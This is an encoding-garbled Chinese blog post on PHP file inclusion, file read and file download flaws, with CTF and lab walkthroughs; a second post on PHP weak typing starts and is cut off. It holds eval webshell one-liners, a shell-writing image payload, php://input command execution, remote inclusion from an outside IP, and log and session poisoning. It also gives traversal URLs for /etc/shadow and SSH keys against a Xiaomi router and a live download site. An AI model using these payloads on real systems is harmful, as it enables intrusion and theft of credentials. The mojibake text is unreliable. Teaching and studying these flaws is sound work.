ä¸ºæµè§ˆå™¨å¯¹ç”¨æˆ·çš„è¾“å…¥æ²¡æœ‰è¿›è¡Œæ£€æŸ¥ï¼Œå¯¼è‡´ä¸åŒç¨‹åº¦çš„ä¿¡æ¯æ³„éœ²ã€æ‹’ç»æœåŠ¡æ”»å‡» ç”šè‡³åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»£ç  1?path=http://192.168.158.119/phpinfo.php 1. æ¼æ´è¯´æ˜1.1 æ— è§†æ–‡ä»¶æ‰©å±•åè¯»å–æ–‡ä»¶ä½¿ç”¨ æ–‡ä»¶åŒ…å« æ—¶ï¼Œphpä¼šè¯»å–æ–‡ä»¶çš„æºç ï¼Œå³ä½¿æ˜¯å›¾ç‰‡æ–‡ä»¶ã€‚å½“é€šè¿‡æ–‡ä»¶åŒ…å«çš„æ–¹å¼æ‰“å¼€ä¸€å¼ å›¾ç‰‡æ—¶ï¼Œä¼šå‘ç°å¹¶æ²¡æœ‰æ‰“å¼€å›¾åƒï¼Œè€Œæ˜¯å›¾ç‰‡çš„ æºç  ã€‚ 1.2 æ— æ¡ä»¶è§£æPHPä»£ç æ–‡ä»¶åŒ…å« åœ¨è¯»å–æ–‡ä»¶æºç çš„åŒæ—¶ï¼Œå¦‚æœé‡åˆ°ç¬¦åˆphpè¯­æ³•è§„èŒƒçš„ä»£ç ï¼Œå°±ä¼šæ— æ¡ä»¶æ‰§è¡Œã€‚æ— è®ºæ˜¯ä»€ä¹ˆæ ¼å¼çš„æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼šphpinfo.zipphpinfo.rar phpinfo.txt 1.3 ç©ºå­—ç¬¦å®‰å…¨ç»•è¿‡â€“00æˆªæ–­æ¡ä»¶ï¼šPHPç‰ˆæœ¬å°äº5.3.4ï¼Œå¹¶ä¸”å…³é—­é­”æœ¯å¼•å· magic_quotes_gpc = Off 1234567891011index.php&lt;?phpif(isset($_GET[&#x27;path&#x27;]))&#123; include $_GET[&#x27;path&#x27;].&quot;.html&quot;;&#125;else&#123; echo &quot;?path=[path]&quot;;&#125;?&gt;index.html&lt;h1&gt;Hello World!&lt;/h1&gt; é­”æœ¯å¼•å·çš„å­˜åœ¨å…³é—­é­”æœ¯å¼•å·éªŒè¯ 1.4 é•¿åº¦æˆªæ–­åˆ©ç”¨æ“ä½œç³»ç»Ÿå¯¹ç›®å½•æœ€å¤§é•¿åº¦çš„é™åˆ¶ï¼Œå¯ä»¥ä¸éœ€è¦ %00 è€Œè¾¾åˆ°æˆªæ–­çš„ç›®çš„ ç›®å½•å­—ç¬¦ä¸²ï¼Œåœ¨ windowä¸‹256å­—èŠ‚ã€linuxä¸‹4096å­—èŠ‚ æ—¶ä¼šè¾¾åˆ°æœ€å¤§å€¼ï¼Œæœ€å¤§å€¼é•¿åº¦ä¹‹åçš„å­—ç¬¦å°†è¢«ä¸¢å¼ƒã€‚ è€Œåˆ©ç”¨â€./â€œçš„æ–¹å¼å³å¯æ„é€ å‡ºè¶…é•¿ç›®å½•å­—ç¬¦ä¸² æ¡ä»¶ï¼šWindowsç³»ç»Ÿï¼Œ 12345678index.php #é™åˆ¶äº†æ–‡ä»¶åç¼€&lt;?phpif(isset($_GET[&#x27;path&#x27;]))&#123; include $_GET[&#x27;path&#x27;].&quot;.html&quot;;&#125;else&#123; echo &quot;?path=[path]&quot;;&#125;?&gt; 1.5 é—®å·,%20,%23 æˆªæ–­è¿œç¨‹æ–‡ä»¶åŒ…å«æ—¶ï¼Œå¦‚æœå‡ºç° 12345678index.php #é™åˆ¶äº†æ–‡ä»¶åç¼€&lt;?phpif(isset($_GET[&#x27;path&#x27;]))&#123; include $_GET[&#x27;path&#x27;].&quot;.html&quot;;&#125;else&#123; echo &quot;?path=[path]&quot;;&#125;?&gt; 1234#ç»•è¿‡ï¼šæ·»åŠ é—®å· ç»“åˆHTTPä¼ å‚çš„åŸç†,é—®å·&quot;?&quot;åé¢çš„ä»£ç è¢«è§£é‡ŠæˆURLçš„querystring?path=http://192.168.158.119/phpinfo.php??path=http://192.168.158.119/phpinfo.php%20?path=http://192.168.158.119/phpinfo.php%23 2. æ¼æ´åˆ©ç”¨2.1è¯»å–æ•æ„Ÿæ–‡ä»¶123456ä½¿ç”¨ç»å¯¹è·¯å¾„ï¼šhttp://192.168.199.131/include/include.php?path=c:\\windows\\System32\\drivers\\etc\\hostså¦‚æœå½“å‰æ–‡ä»¶å¤¹ä¸æ‰€è¦åŒ…å«çš„æ–‡ä»¶å¤¹åœ¨åŒä¸€ç›˜ç¬¦ä¸‹ï¼š #å¯ç›®å½•ç©¿è¶Šhttp://192.168.199.131/include/include.php?path=..\\..\\..\\..\\..\\..\\..\\..\\windows\\System32\\drivers\\etc\\hosts 2.1.1 å¸¸è§æ•æ„Ÿä¿¡æ¯è·¯å¾„1234567891011121314151617181920212223242526272829#Windowsç³»ç»Ÿc:\\boot.ini // æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬c:\\windows\\system32\\inetsrv\\MetaBase.xml // IISé…ç½®æ–‡ä»¶c:\\windows\\repair\\sam // å­˜å‚¨Windowsç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç c:\\ProgramFiles\\mysql\\my.ini // MySQLé…ç½®c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD // MySQL rootå¯†ç c:\\windows\\php.ini // php é…ç½®ä¿¡æ¯#Linux/Unixç³»ç»Ÿ/etc/passwd // è´¦æˆ·ä¿¡æ¯/etc/shadow // è´¦æˆ·å¯†ç æ–‡ä»¶/usr/local/app/apache2/conf/httpd.conf // Apache2é»˜è®¤é…ç½®æ–‡ä»¶/usr/local/app/apache2/conf/extra/httpd-vhost.conf // è™šæ‹Ÿç½‘ç«™é…ç½®/usr/local/app/php5/lib/php.ini // PHPç›¸å…³é…ç½®/etc/httpd/conf/httpd.conf // Apacheé…ç½®æ–‡ä»¶/etc/my.conf // mysql é…ç½®æ–‡ä»¶ 2.2 åŒ…å«å›¾ç‰‡æœ¨é©¬12345http://192.168.199.131/include/include.php?path=./future_ma1.jpgfuture_ma1.jpg æ˜¯ç»è¿‡ &lt;?php @eval($_REQUEST[&#x27;aaa&#x27;]); ?&gt; å¤„ç†è¿‡çš„å›¾ç‰‡æœ¨é©¬å¯ä¸­å›½èšå‰‘è¿›è¡Œè¿æ¥ 2.3 åŒ…å«æœ¨é©¬å†™ shell123å°†å¦‚ä¸‹ä»£ç æ’å…¥å›¾ç‰‡å½“ä¸­ï¼š&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&quot;&lt;?php @eval($_REQUEST[&#x27;cmd&#x27;])?&gt;&quot;); ?&gt;å«ä¹‰ï¼šåœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªshell.phpæ–‡ä»¶ï¼Œå†…å®¹ä¸º&lt;?php @eval($_REQUEST[&#x27;cmd&#x27;])?&gt;ä¸€å¥è¯æœ¨é©¬ï¼Œå½“ç›´æ¥åŒ…å«æ–‡ä»¶æ—¶ï¼Œå°±ä¼šæ‰§è¡Œã€‚ 2.4 PHP å°è£…åè®®æ¡ä»¶ï¼š 123php.iniæ–‡ä»¶ï¼šæœ¬åœ°ï¼šallow_url_fopen=Onè¿œç¨‹ï¼šallow_url_include=On 2.4.1 è®¿é—®æœ¬åœ°æ–‡ä»¶12#ä½¿ç”¨file://åè®®?path=file://c:\\windows\\System32\\drivers\\etc\\hosts 123#data://åè®®?path=data://text/plain,&lt;?php phpinfo(); ?&gt;?path=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg== 123456789#å…·ä½“ç¤ºä¾‹ï¼š#å½“å‰æ–‡ä»¶è·¯å¾„?page=data://text/plain, &lt;?php echo $_SERVER[&#x27;DOCUMENT_ROOT&#x27;]; ?&gt; #éå†å½“å‰è·¯å¾„ä¸‹çš„æ‰€æœ‰æ–‡ä»¶?page=data://text/plain, &lt;?php print_r(scandir(&#x27;/var/www&#x27;))?&gt; #è¯»å–æŒ‡å®šæ–‡ä»¶ ?page=data://text/plain, &lt;?php $a = file_get_contents(&#x27;fl4gisisish3r3.php&#x27;);echo htmlentities($a); ?&gt; 2.4.2 è¯»å–PHPæ–‡ä»¶123?path=php://filter/read=convert.base64-encode/resource=phpinfo.phpå°†æ‰€å¾—å†…å®¹è¿›è¡Œ base64è§£ç å³å¯ 2.4.3 æ‰§è¡ŒPHPå‘½ä»¤123?file=php://inputpost:&lt;?php system(&#x27;ipconfig&#x27;);?&gt; &lt;?php system(&#x27;whoami&#x27;);?&gt; 2.5 åŒ…å«æ—¥å¿—æ–‡ä»¶nigux æ—¥å¿—æ–‡ä»¶è·¯å¾„ /var/log/nginx/assess.log /var/log/nginx/error.log apache+Linuxæ—¥å¿—é»˜è®¤è·¯å¾„ /etc/httpd/logs/access_log/var/log/httpd/access_log apache+win2003æ—¥å¿—é»˜è®¤è·¯å¾„ 12D:\\xampp\\apache\\logs\\access.logD:\\xampp\\apache\\logs\\error.log IIS6.0+win2003é»˜è®¤æ—¥å¿—æ–‡ä»¶ 1C:\\WINDOWS\\system32\\Logfiles IIS7.0+win2003 é»˜è®¤æ—¥å¿—æ–‡ä»¶ 1%SystemDrive%inetpublogsLogFiles nginx æ—¥å¿—æ–‡ä»¶åœ¨ç”¨æˆ·å®‰è£…ç›®å½•çš„logsç›®å½•ä¸‹ å¦‚å®‰è£…ç›®å½•ä¸º/usr/local/nginx,åˆ™æ—¥å¿—ç›®å½•å°±æ˜¯åœ¨/usr/local/nginx/logsé‡Œ ä¹Ÿå¯é€šè¿‡å…¶é…ç½®æ–‡ä»¶Nginx.confï¼Œè·å–åˆ°æ—¥å¿—çš„å­˜åœ¨è·¯å¾„ï¼ˆ/opt/nginx/logs/access.logï¼‰ 2.5.1 Apache é”™è¯¯æ—¥å¿—æ–‡ä»¶ getshellphpstudy2016(Apache)+Win2003 D:\\phpStudy\\Apache\\logs\\error.log æ„é€ ä¸€å¥è¯æœ¨é©¬å†™å…¥ Apacheæ—¥å¿—æ–‡ä»¶å½“ä¸­ è®¿é—® èšå‰‘è¿æ¥ phpstudyå°çš®é¢æ¿(Apache)+Win10 D:\\phpstudy_pro\\Extensions\\Apache2.4.39\\logs 2.5.2 session æ–‡ä»¶åŒ…å«12345&lt;?phpsession_start();$ctfs=$_GET[&#x27;ctfs&#x27;];$_SESSION[&quot;username&quot;]=$ctfs;?&gt; å¦‚æœå­˜åœ¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå°±å¯ä»¥é€šè¿‡ctfså†™å…¥æ¶æ„ä»£ç åˆ°sessionæ–‡ä»¶ä¸­ï¼Œç„¶åé€šè¿‡æ–‡ä»¶åŒ…å«æ¼æ´æ‰§è¡Œæ­¤æ¶æ„ä»£ç getshellã€‚ 2.6 ä»»æ„ç›®å½•éå† ../../é˜²å¾¡ï¼šphp.ini å½“ä¸­çš„é…ç½® open_basedir ï¼Œå°†å¾ˆå¥½å¯ä»¥è®¾ç½®ç”¨æˆ·éœ€è¦æ‰§è¡Œçš„æ–‡ä»¶ç›®å½•ï¼Œå¦‚æœè®¾ç½®ç›®å½•çš„è¯ï¼ŒPHPä»…ä»…åœ¨è¯¥ç›®å½•å†…æœç´¢æ–‡ä»¶ã€‚è€Œæ²¡æœ‰è®¾ç½®open_basediræ—¶ï¼Œæ–‡ä»¶åŒ…å«æ¼æ´å¯ä»¥è®¿é—®ä»»æ„æ–‡ä»¶ã€‚ ç»æŸ¥çœ‹ä¹‹åï¼Œå„ä¸ªç‰ˆæœ¬çš„phpè¯¥é…ç½®é»˜è®¤å¦‚ä¸‹ï¼š ä¿®æ”¹é…ç½®ï¼Œåªå…è®¸ç”¨æˆ·åŒ…å«æŒ‡å®šç›®å½•ä¸‹çš„æ–‡ä»¶ å†æ¬¡å°è¯•åŒ…å«éæŒ‡å®šç›®å½•ä¸‹çš„æ–‡ä»¶ 123456#å„ç§è¯­è¨€æ–‡ä»¶åŒ…å«#ASP ASPX PHP JSP Python Javaweb&lt;c:import url=&quot;http://...&quot;&gt;&lt;jsp:include page=&quot;head.jsp&quot;/&gt;&lt;%@ include file=&quot;head.jsp&quot;%&gt;&lt;?php include (&#x27;test.php&#x27;) ?&gt; 3. æ¼æ´é˜²å¾¡ ä¸¥æ ¼é™åˆ¶åŒ…å«ä¸­çš„å‚æ•°ï¼Œå–æ¶ˆé‚£äº›ä¸å¯æ§çš„å‚æ•°ã€‚ å¼€å¯open_basedir é…ç½®ï¼Œå°†å…¶è®¾ç½®ä¸ºæŒ‡å®šç›®å½•ï¼Œåˆ™åªæœ‰è¯¥ç›®å½•çš„æ–‡ä»¶å…è®¸è¢«è®¿é—® å¦‚æœä¸éœ€è¦æ–‡ä»¶åŒ…å«ï¼Œåˆ™å…³é—­allow_url_include()å‡½æ•°ï¼Œé˜²æ­¢è¿œç¨‹æ–‡ä»¶åŒ…å« å›ºå®šåç¼€ å›ºå®šæ–‡ä»¶ WAF äº§å“ æ£€æµ‹ï¼š ç™½ç›’ï¼šä»£ç å®¡è®¡ é»‘ç›’ï¼šæ¼æ‰«å·¥å…·ï¼Œå…¬å¼€æ¼æ´ï¼Œæ‰‹å·¥æŸ¥çœ‹å‚æ•°ä»¥åŠåŠŸèƒ½ç‚¹ åˆ©ç”¨ï¼š http ftp ftp://username:password@192.168.0.1:21/profile file å„ç§è„šæœ¬æ”¯æŒçš„åè®® äºŒã€æ–‡ä»¶è¯»å–æ¼æ´â€“æ˜¾ç¤ºæºä»£ç 12345&lt;?php $filename=â€test.txtâ€;readfile($filename);?&gt; #è¾“å‡ºæ–‡ä»¶å†…å®¹ 12345&lt;?php$filename=â€test.txtâ€;echo file_get_contents($filename);?&gt; #å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸² ç›¸å…³å‡½æ•°ï¼š 1234readfile()file_get_contents()fopen()å˜é‡ï¼š$filename 2.1 ç™¾åº¦æ¯2017äºŒæœˆ-ZoneçœŸé¢˜å¤ç°ç½‘å€ åˆ†åˆ«æŠ“åŒ…ï¼Œä¿®æ”¹å‚æ•° login=1 è¯•è¯• å‘ç°ä¿®æ”¹ Mini-Zone æ•°æ®åŒ…å½“ä¸­çš„ login=1 ä¹‹åæˆåŠŸè¿›å…¥ç®¡ç†å‘˜çš„ç•Œé¢ å¯¹ manage å†æŠ“åŒ…ï¼Œä¿®æ”¹ login=1 ï¼Œè·å– /manages/admin.php?module=index&amp;name=php ã€‚ mvcæ¶æ„ è¯»å–nginxé…ç½®æ–‡ä»¶ 1GET /manages/admin.php?module=..././..././..././etc/nginx/nginx.conf&amp;name= HTTP/1.1 è·å¾—è¿”å›200 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127HTTP/1.1 200 OKDate: Fri, 16 Apr 2021 14:13:40 GMTContent-Type: text/html; charset=UTF-8Connection: closeVary: Accept-Encodingcontent-text: text/html;charset=gbkX-Via-JSL: 38ae086,-X-Cache: bypassContent-Length: 2708 #user nobody;worker_processes 1;#error_log logs/error.log;#error_log logs/error.log notice;#error_log logs/error.log info;#pid run/nginx.pid;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application/octet-stream; #log_format main &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27; # &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27; # &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;; #access_log logs/access.log main; sendfile on; #tcp_nopush on; #keepalive_timeout 0; keepalive_timeout 65; #gzip on; #server &#123; # listen 80; # server_name localhost; #charset koi8-r; #access_log logs/host.access.log main; # location / &#123; # root html; # index index.html index.htm; # &#125; #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # # error_page 500 502 503 504 /50x.html; # location = /50x.html &#123; # root html; # &#125; # proxy the PHP scripts to Apache listening on 127.0.0.1:80 # #location ~ \\.php$ &#123; # proxy_pass http://127.0.0.1; #&#125; # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # #location ~ \\.php$ &#123; # root html; # fastcgi_pass 127.0.0.1:9000; # fastcgi_index index.php; # fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; # include fastcgi_params; #&#125; # deny access to .htaccess files, if Apache&#x27;s document root # concurs with nginx&#x27;s one # #location ~ /\\.ht &#123; # deny all; #&#125; #&#125; # another virtual host using mix of IP-, name-, and port-based configuration # #server &#123; # listen 8000; # listen somename:8080; # server_name somename alias another.alias; # location / &#123; # root html; # index index.html index.htm; # &#125; #&#125; # HTTPS server # #server &#123; # listen 443 ssl; # server_name localhost; # ssl_certificate cert.pem; # ssl_certificate_key cert.key; # ssl_session_cache shared:SSL:1m; # ssl_session_timeout 5m; # ssl_ciphers HIGH:!aNULL:!MD5; # ssl_prefer_server_ciphers on; # location / &#123; # root html; # index index.html index.htm; # &#125; #&#125; include sites-enabled/default;//åŒ…å«æ–‡ä»¶&#125; å†å°è¯• 1GET /manages/admin.php?module=..././..././..././etc/nginx/sites-enabled/default&amp;name= HTTP/1.1 æ‰€è·å–åˆ°çš„å†…å®¹æœ‰ 1234location /online-movies &#123; alias /movie/; autoindex on; &#125; ç»§ç»­æ„é€  1GET /online-movies../var/www/html/flag.php HTTP/1.1 å‚è€ƒ 2.2 å°ç±³è·¯ç”±å™¨è¿œç¨‹ä»»æ„æ–‡ä»¶è¯»å–å°ç±³è·¯ç”±å™¨è¿œç¨‹ä»»æ„æ–‡ä»¶è¯»å– Fofaæœç´¢ 1http://192.168.31.1/api-third-party/download/extdisks../etc/shadow ä¸‰ã€æ–‡ä»¶ä¸‹è½½æ¼æ´â€“æ–‡ä»¶è¢«ä¸‹è½½ ä¸€èˆ¬æ–‡ä»¶ï¼šåå°é¦–é¡µæ—¥å¿—ç­‰å¯è§æ–‡ä»¶ æ•æ„Ÿæ–‡ä»¶ï¼š é…ç½®æ–‡ä»¶ï¼ˆæ•°æ®åº“ï¼Œå¹³å°ï¼Œï¼‰ å„ç§æ¥å£æ–‡ä»¶ å¯†é’¥ä¿¡æ¯ç­‰æ–‡ä»¶ æ–‡ä»¶ä¸‹è½½æ–¹å¼ï¼š 1&lt;a href=â€http://www.a.com/xxx.rarâ€&gt;ä¸‹è½½&lt;/a&gt; 123456789&lt;?php $filename = $_GET[&#x27;filename&#x27;]; echo &#x27;&lt;h1&gt;è®²å¼€å§‹ä¸‹è½½æ–‡ä»¶ï¼&lt;/h1&gt;&lt;br /&gt;&lt;br /&gt;&#x27;; echo file_get_contents($filename); header(&#x27;Content-Type: imgage/jpeg&#x27;); header(&#x27;Content-Disposition: attachment; filename=&#x27;.$filename); header(&#x27;Content-Lengh: &#x27;.filesize($filename));?&gt; 3.1 Pikachu ä¹‹ Insafe Filedownload â€” å‚æ•°å€¼--?filename=12docker build -t &quot;pikachu&quot; .docker run -d -p8080:80 pikachu 123456789#å›¾ç‰‡æ‰€åœ¨ä½ç½®http://pikachu/vul/unsafedownload/download/ai.png#ä¸‹è½½å›¾ç‰‡é“¾æ¥pikachu/vul/unsafedownload/execdownload.php?filename=ai.png#å¾—çŸ¥ download/ å’Œ execdownload.php åœ¨ unsafedownload/ç›®å½•ä¸‹#å°è¯•ä¸‹è½½ execdownload.phppikachu/vul/unsafedownload/execdownload.php?filename=../execdownload.php ä¸‹è½½æˆåŠŸ æˆ‘ä»¬ç»§ç»­æ ¹æ® execdownload.php è¿™ä¸ªæ–‡ä»¶å½“ä¸­çš„å†…å®¹è·å–ä¸€äº›æ–‡ä»¶çš„è·¯å¾„ï¼Œè¿›è€Œç»§ç»­ä¸‹è½½ï¼Œå‘ç° 12include_once $PIKA_ROOT_DIR.&quot;inc/function.php&quot;;$file_path=&quot;download/&#123;$_GET[&#x27;filename&#x27;]&#125;&quot;; å°è¯• 1http://pikachu/vul/unsafedownload/execdownload.php?filename=../../../inc/function.php æˆåŠŸä¸‹è½½ å·¥å…·æ‰«æé…ç½®æ–‡ä»¶ ï¼šconfig.inc.php è·å–æ•°æ®åº“è´¦æˆ·å¯†ç ç­‰é…ç½®ä¿¡æ¯ 3.2 znds ç½‘ç«™ â€“ åŠŸèƒ½ç‚¹znds éšä¾¿ä¸‹è½½ä¸€æ¬¾è½¯ä»¶ï¼Œå³é”® å¤åˆ¶ä¸‹è½½é“¾æ¥ 12345678#ä¸‹è½½å¥½çš„æ–‡ä»¶åï¼š xxpt_1.0.5_dangbei.apk#ä¸‹è½½é“¾æ¥ï¼š http://down.znds.com/getdownurl/?s=L2Rvd24vMjAxODExMjAveHhwdF8xLjAuNV9kYW5nYmVpLmFwaw==#åŠ å¯†éƒ¨åˆ†ï¼š /down/20181120/xxpt_1.0.5_dangbei.apk#æ¸…æ™°çš„URLï¼š http://down.znds.com/getdownurl/?s=/down/20181120/xxpt_1.0.5_dangbei.apk ä¿¡æ¯æ”¶é›†ï¼Œè·å–ç½‘ç«™è„šæœ¬ç±»å‹ï¼Œä½¿ç”¨ç›¸åº”çš„è„šæœ¬æ–‡ä»¶å»æ‰«æ/ä¸‹è½½ ç¤ºä¾‹ï¼šè®°å¾—åŠ å¯† 1234å°è¯•ä¸‹è½½å…¶å®ƒæ–‡ä»¶ï¼šhttp://down.znds.com/getdownurl/index.php/?s=index.phpå¯¹åº”åŠ å¯†ï¼šhttp://down.znds.com/getdownurl/?s=aW5kZXgucGhw 3.3 RoarCTF2019-æ–‡ä»¶è¯»å–çœŸé¢˜å¤ç° â€“ JAVAWEBRoarCTF2019-æ–‡ä»¶è¯»å–çœŸé¢˜å¤ç° å¯¹ help å³é”® å¤åˆ¶é“¾æ¥åœ°å€ ï¼Œå‘ç°æ˜¯ æ–‡ä»¶ä¸‹è½½ 1http://0e351c4c-e667-4d71-8086-639b36d07883.node3.buuoj.cn/Download?filename=help.docx å°† filename å‚æ•°ä½¿ç”¨ post ä¼ é€’ï¼Œå‘ç°å¯ä¸‹è½½ help.docx å¾ˆæ˜¾ç„¶ï¼Œæ˜¯è€ä½ çš„ Javaå¼€å‘ å½“ä¸­çš„ä¸€ä¸ª ç»å¸¸ä½¿ç”¨çš„é…ç½®æ–‡ä»¶ WEB-INF/web.xmlï¼Œä¼šè®°å½•è®¸å¤šä¿¡æ¯ï¼Œå°è¯•ä¸‹è½½ å‘ç°å«æœ‰ Flagæ–‡ä»¶ï¼Œå°è¯•ä¸‹è½½ 1http://0e351c4c-e667-4d71-8086-639b36d07883.node3.buuoj.cn/Flag æ˜¾ç„¶ï¼Œè·¯å¾„ä¸æ­£ç¡® å®é™…ä¸Š å…³é”®ç‚¹åœ¨äº ï¼ŒJAVAå¼€å‘è¿‡ç¨‹ä¸­ï¼Œå…¶æ–‡ä»¶æ˜¯å‚¨å­˜åœ¨å®ƒçš„æ§åˆ¶å™¨å½“ä¸­çš„ï¼Œè·¯å¾„å¦‚ä¸‹ï¼šå› ä¸ºJavaå­—èŠ‚ç ç±»æ–‡ä»¶ï¼ˆ.classï¼‰æ˜¯Javaç¼–è¯‘å™¨ç¼–è¯‘Javaæºæ–‡ä»¶ï¼ˆ.javaï¼‰äº§ç”Ÿçš„â€œç›®æ ‡æ–‡ä»¶â€ã€‚æœ€ç»ˆå¾—å‡ºflagçš„å…³é”®æ–‡ä»¶ä½ç½®ä¸ºï¼š/WEB-INF/classes/com/wm/ctf/FlagController.class 1filename=WEB-INF/classes/com/wm/ctf/FlagController.class å››ã€æ€»ç»“å‚æ•°å‘ç°ï¼š 123456789101112131415161718192021222324252627282930read.xxx?filenamedown.xxx?filenamereadfiledownfile&amp;readpath&amp;filepath&amp;inputfile&amp;url&amp;data&amp;readfile&amp;menuMETA-INFWEB-INF&amp;RealPath=&amp;FilePath=&amp;ï¬lepath=&amp;Path=&amp;path=&amp;inputFile=&amp;url=&amp;urls=&amp;Lang=&amp;dis=&amp;data=&amp;readï¬le=&amp;ï¬lep=&amp;src=&amp;menu=META-INFWEB-INF Windows æ•æ„Ÿä¿¡æ¯ï¼š 1234567C:\\boot.ini //æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬C:\\Windows\\System32\\inetsrv\\MetaBase.xml //IISé…ç½®æ–‡ä»¶C:\\Windows\\repair\\sam //å­˜å‚¨ç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç C:\\Program Files\\mysql\\my.ini //Mysqlé…ç½®C:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql rootC:\\Windows\\php.ini //phpé…ç½®ä¿¡æ¯C:\\Windows\\my.ini //Mysqlé…ç½®ä¿¡æ¯ Linux æ•æ„Ÿä¿¡æ¯ï¼š 12345678910111213/root/.ssh/authorized_keys/root/.ssh/id_rsa/root/.ssh/id_ras.keystore/root/.ssh/known_hosts/etc/passwd/etc/shadow/etc/my.cnf/etc/httpd/conf/httpd.conf/root/.bash_history/root/.mysql_history/proc/self/fd/fd[0-9]*(æ–‡ä»¶æ ‡è¯†ç¬¦)/proc/mounts/porc/config.gz åˆ©ç”¨æ€è·¯ï¼š ä¸‹è½½å¸¸è§„çš„é…ç½®æ–‡ä»¶ï¼Œä¾‹å¦‚: ssh,weblogic,ftp,mysqlç­‰ç›¸å…³é…ç½® ä¸‹è½½å„ç§.logæ–‡ä»¶ï¼Œä»ä¸­å¯»æ‰¾ä¸€äº›åå°åœ°å€ï¼Œæ–‡ä»¶ä¸Šä¼ ç‚¹ä¹‹ç±»çš„åœ°æ–¹ï¼Œå¦‚æœè¿æ°”å¥½çš„è¯ä¼šè·å¾—ä¸€äº›å‰è¾ˆä»¬çš„åé—¨ã€‚ ä¸‹è½½webä¸šåŠ¡æ–‡ä»¶è¿›è¡Œç™½ç›’å®¡è®¡ï¼Œåˆ©ç”¨æ¼æ´è¿›ä¸€æ­¥æ”»å…¥æœåŠ¡å™¨ã€‚ æ€»çš„æ¥è¯´ï¼Œæ‰€æœ‰ä¸å‰ç«¯äº¤äº’çš„æ•°æ®éƒ½æ˜¯ä¸å®‰å…¨çš„ï¼Œä¸èƒ½æ‰ä»¥è½»å¿ƒï¼ å‚è€ƒ","categories":[{"name":"Webæ¼æ´åŸºç¡€ç¯‡","slug":"Webæ¼æ´åŸºç¡€ç¯‡","permalink":"https://xizhi-future.github.io/categories/Web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E7%AF%87/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://xizhi-future.github.io/tags/Web/"},{"name":"æ¼æ´","slug":"æ¼æ´","permalink":"https://xizhi-future.github.io/tags/%E6%BC%8F%E6%B4%9E/"},{"name":"æ–‡ä»¶åŒ…å«","slug":"æ–‡ä»¶åŒ…å«","permalink":"https://xizhi-future.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}],"author":"xizhi-future"},{"title":"CTFä¹‹PHP","slug":"CTFä¹‹PHP","date":"2021-06-06T14:42:17.000Z","updated":"2021-07-09T07:52:08.378Z","comments":true,"path":"2021/06/06/CTFä¹‹PHP/","link":"","permalink":"https://xizhi-future.github.io/2021/06/06/CTF%E4%B9%8BPHP/","excerpt":"","text":"ä¸€ã€PHP CTF1.1 PHP å¼±ç±»å‹123== å’Œ != æ¯”è¾ƒè‹¥ç±»å‹ä¸åŒï¼Œå…ˆå¿è¯•è½¬æ¢ç±»å‹ï¼Œå†ä½œå€¼æ¯”è¾ƒï¼Œæœ€åè¿”å›å€¼æ¯”è¾ƒç»“æœ ã€‚è€Œ=== å’Œ !== åªæœ‰åœ¨ç›¸åŒç±»å‹ä¸‹,æ‰ä¼šæ¯”è¾ƒå…¶å€¼ã€‚ **== ä¸ ===**ï¼š== ä¸åŒ…æ‹¬ ç±»å‹ï¼Œ=== åŒ…æ‹¬ ç±»å‹ **==**ï¼šé‡åˆ°å­—ç¬¦ä¸²ä¸æ•°å€¼è¿›è¡Œæ¯”è¾ƒæ—¶ï¼Œå…ˆå°†å­—ç¬¦ä¸²ç±»å‹è½¬æ¢æˆæ•°å€¼å‹ï¼Œå†è¿›è¡Œæ¯”è¾ƒ 123è½¬æ¢æ–¹æ³•ï¼šå¦‚æœè¯¥å­—ç¬¦ä¸²æ²¡æœ‰åŒ…å«&#x27;.&#x27;,&#x27;e&#x27;,&#x27;E&#x27;å¹¶ä¸” å…¶æ•°å€¼åœ¨æ•´å‹çš„èŒƒå›´ä¹‹å†…è¯¥å­—ç¬¦ä¸²è¢«å½“ä½œintæ¥å–å€¼ï¼Œå…¶ä»–æ‰€æœ‰æƒ…å†µä¸‹éƒ½è¢«ä½œä¸ºfloatæ¥å–å€¼ï¼Œè¯¥å­—ç¬¦ä¸²çš„å¼€å§‹éƒ¨åˆ†å†³å®šäº†å®ƒçš„å€¼ï¼Œå¦‚æœè¯¥å­—ç¬¦ä¸²ä»¥åˆæ³•çš„æ•°å€¼å¼€å§‹ï¼Œåˆ™ä½¿ç”¨è¯¥æ•°å€¼ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚ 1234567&lt;?phpvar_dump(&quot;admin&quot;==0); //truevar_dump(&quot;1admin&quot;==1); //truevar_dump(&quot;admin1&quot;==1) //falsevar_dump(&quot;admin1&quot;==0) //truevar_dump(&quot;0e123456&quot;==&quot;0e4456789&quot;); //true ç§‘å­¦æŠ€æœ¯æ³•ï¼Œ0çš„æ— è®ºå¤šå°‘æ¬¡æ–¹éƒ½æ˜¯0?&gt; 1234567&lt;?php2 $test=1 + &quot;10.5&quot;; //$test=11.5(float)3 $test=1+&quot;-1.3e3&quot;; //$test=-1299(float)4 $test=1+&quot;bob-1.3e3&quot;; 